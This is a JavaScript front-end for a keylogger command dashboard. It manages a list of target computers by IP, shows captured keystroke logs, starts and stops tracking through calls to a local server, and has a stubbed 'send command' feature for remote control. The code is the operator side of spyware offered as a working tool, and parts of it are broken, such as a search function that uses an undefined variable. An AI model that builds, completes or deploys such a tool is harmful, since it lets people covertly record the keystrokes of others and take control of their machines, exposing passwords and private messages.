// API Configuration
let API_URL = 'http://127.0.0.1:5000/api';

// Sidebar & Sections
const sidebarLinks = document.querySelectorAll('.nav a');
const sections = document.querySelectorAll('.section');

// Computers / Details
const computersContainer = document.getElementById('computers-container');
const computerDetailsSection = document.getElementById('computer-details');
const closeDetailsBtn = document.getElementById('close-details');
const detailName = document.getElementById('detail-name');
const detailId = document.getElementById('detail-id');
const detailIp = document.getElementById('detail-ip');
const keylogData = document.getElementById('keylog-data');
const systemInfo = document.getElementById('system-info');
const searchInput = document.getElementById('search-input');
const startLogging = document.getElementById('start-logging');
const stopLogging = document.getElementById('stop-logging');

// Modal: Send Command
const controlComputerBtn = document.getElementById('control-computer-btn');
const controlComputerModal = document.getElementById('control-computer-modal');
const sendCommandForm = document.getElementById('send-command-form');
const commandInput = document.getElementById('command-input');

// Modal: Add Computer
const addComputerBtn = document.getElementById('add-computer-btn');
const addComputerModal = document.getElementById('add-computer-modal');
const addComputerForm = document.getElementById('add-computer-form');
const newComputerNameInput = document.getElementById('new-computer-name');
const newComputerIpInput = document.getElementById('new-computer-ip');

// Close buttons (modals)
const modalCloseButtons = document.querySelectorAll('.modal-close, .modal-cancel');

// Dashboard
const totalComputersElem = document.getElementById('total-computers');
const activeKeyloggersElem = document.getElementById('active-keyloggers');
const lastCommandElem = document.getElementById('last-command');
let activityChart = null;

// Settings
const apiUrlInput = document.getElementById('api-url');
const authTokenInput = document.getElementById('auth-token');
const saveSettingsBtn = document.getElementById('save-settings-btn');

// Global Keylog
const keylogTableBody = document.getElementById('keylog-table-body');

// State
let currentComputerId = null;
let computersData = JSON.parse(localStorage.getItem('computersData')) || [];

// Mock Data for testing UI
// Load mock data into table
// Load mock data into table
async function loadMockData() {
  const mockKeylogData = await getData();  // לחכות לתוצאה מה-API
  if (!keylogTableBody) {
    console.error("Error: keylog-table-body not found!");
    return;
  }
  keylogTableBody.innerHTML = '';
  const keylogEntries = mockKeylogData.data || [];  // גישה למערך בתוך המפתח data
  if (keylogEntries.length === 0) {
    const noDataRow = document.createElement('tr');
    noDataRow.innerHTML = `<td colspan="3" style="text-align: center;">No data available</td>`;
    keylogTableBody.appendChild(noDataRow);
    return;
  }
  keylogEntries.forEach(entry => {
    const row = document.createElement('tr');
    row.innerHTML = `
      <td>${entry.timestamp}</td>
      <td>${entry.computer}</td>
      <td>${entry.log}</td>
    `;
    keylogTableBody.appendChild(row);
  });
}



// Filter table based on search input
function handleSearch() {
  const searchTerm = searchInput.value.toLowerCase();
  keylogTableBody.innerHTML = '';
  const filteredData = mockKeylogData.filter(entry =>
      entry.computer.toLowerCase().includes(searchTerm)
  );
  if (filteredData.length === 0) {
    const noDataRow = document.createElement('tr');
    noDataRow.innerHTML = `<td colspan="3" style="text-align: center;">No matching data</td>`;
    keylogTableBody.appendChild(noDataRow);
  } else {
    filteredData.forEach(entry => {
      const row = document.createElement('tr');
      row.innerHTML = `
        <td>${entry.timestamp}</td>
        <td>${entry.computer}</td>
        <td>${entry.log}</td>
      `;
      keylogTableBody.appendChild(row);
    });
  }
}

// Initialize page content
document.addEventListener('DOMContentLoaded', () => {
  loadMockData();
  updateComputersList();
  initNavLinks();
  setupEventListeners();
  initDashboardChart();
  printToConsole();
});

function printToConsole() {
  const startLogging = document.getElementById('start-logging');
  const stopLogging = document.getElementById('stop-logging');

  if (startLogging && stopLogging) {
    startLogging.addEventListener('click', () => start_tracking());
    stopLogging.addEventListener('click', () => stop_tracking());
  }
}
// Navigation
function initNavLinks() {
  sidebarLinks.forEach(link => {
    link.addEventListener('click', event => {
      event.preventDefault();
      const sectionToShow = link.getAttribute('data-section');
      sections.forEach(s => s.classList.remove('active'));
      sidebarLinks.forEach(l => l.classList.remove('active'));
      document.getElementById(`${sectionToShow}-section`).classList.add('active');
      link.classList.add('active');
    });
  });
}

// Event Listeners
function setupEventListeners() {
  closeDetailsBtn.addEventListener('click', () => {
    computerDetailsSection.classList.add('hidden');
  });

  controlComputerBtn.addEventListener('click', () => openModal(controlComputerModal));
  addComputerBtn.addEventListener('click', () => openModal(addComputerModal));
  addComputerForm.addEventListener('submit', handleAddComputer);

  modalCloseButtons.forEach(button => {
    button.addEventListener('click', event => {
      const modal = event.target.closest('.modal-overlay');
      closeModal(modal);
    });
  });

  sendCommandForm.addEventListener('submit', handleSendCommand);
  searchInput.addEventListener('input', handleSearch);
  saveSettingsBtn.addEventListener('click', handleSaveSettings);
}

// Modal Functions
function openModal(modal) {
  modal.classList.remove('hidden');
}
function closeModal(modal) {
  modal.classList.add('hidden');
}

// Add Computer
function handleAddComputer(event) {
  event.preventDefault();
  const name = newComputerNameInput.value.trim();
  const ip = newComputerIpInput.value.trim();
  const ipRegex = /^(25[0-5]|2[0-4]\d|[01]?\d\d?)(\.(25[0-5]|2[0-4]\d|[01]?\d\d?)){3}$/;

  if (!name || !ip) {
    alert('Please fill in all fields.');
    return;
  }
  if (!ipRegex.test(ip)) {
    alert('Invalid IP address format.');
    return;
  }

  const newComputer = {
    id: Date.now().toString(),
    name: name,
    ip: ip
  };
  computersData.push(newComputer);
  localStorage.setItem('computersData', JSON.stringify(computersData));
  updateComputersList();
  totalComputersElem.textContent = computersData.length;
  addComputerForm.reset();
  closeModal(addComputerModal);
}

// Update Computers List with Remove Functionality
function updateComputersList() {
  computersContainer.innerHTML = '';
  computersData.forEach((computer, index) => {
    const li = document.createElement('li');
    li.className = 'computer-item';
    li.innerHTML = `
      <span>${computer.name}</span>
      <button class="remove-computer-btn" data-index="${index}">Remove</button>
    `;
    li.querySelector('span').addEventListener('click', () => {
      currentComputerId = computer.id;
      detailName.textContent = computer.name;
      detailId.textContent = computer.id;
      detailIp.textContent = computer.ip;
      systemInfo.textContent = 'System info not available.';
      keylogData.textContent = 'Keylog data not available.';
      computerDetailsSection.classList.remove('hidden');
    });
    li.querySelector('.remove-computer-btn').addEventListener('click', () => {
      computersData.splice(index, 1);
      localStorage.setItem('computersData', JSON.stringify(computersData));
      updateComputersList();
      totalComputersElem.textContent = computersData.length;
    });
    computersContainer.appendChild(li);
  });
  totalComputersElem.textContent = computersData.length;
}

// Send Command
function handleSendCommand(event) {
  event.preventDefault();
  const command = commandInput.value.trim();
  if (command && currentComputerId) {
    console.log(`Sending command "${command}" to computer ${currentComputerId}`);
    lastCommandElem.textContent = command;
    sendCommandForm.reset();
    closeModal(controlComputerModal);
  }
}

// Settings
function handleSaveSettings() {
  if (apiUrlInput.value) {
    API_URL = apiUrlInput.value;
  }
  console.log('Settings saved. Current API:', API_URL);
}

// Chart
function initDashboardChart() {
  const ctx = document.getElementById('activityChart');
  if (!ctx) return;
  activityChart = new Chart(ctx, {
    type: 'bar',
    data: {
      labels: [],
      datasets: [{
        label: 'Keylogger Activity',
        data: [],
        backgroundColor: '#ff1744',
      }],
    },
    options: {
      responsive: true,
      scales: {
        y: { beginAtZero: true }
      },
    },
  });
}

async function getData() {
  try {
    let response = await fetch('http://127.0.0.1:5000/');
    let data = await response.json();
    console.log(data);
    return data
  } catch (error) {
    console.error('Error:', error);
  }
}
let data = getData()


async function start_tracking() {
fetch('http://127.0.0.1:5000/start_tracking')
  .then(response => console.log('Sent successfully:', response))
  .catch(error => console.error('Error:', error));

}
async function stop_tracking() {
fetch('http://127.0.0.1:5000/stop_tracking')
  .then(response => console.log('Sent successfully:', response))
  .catch(error => console.error('Error:', error));

}
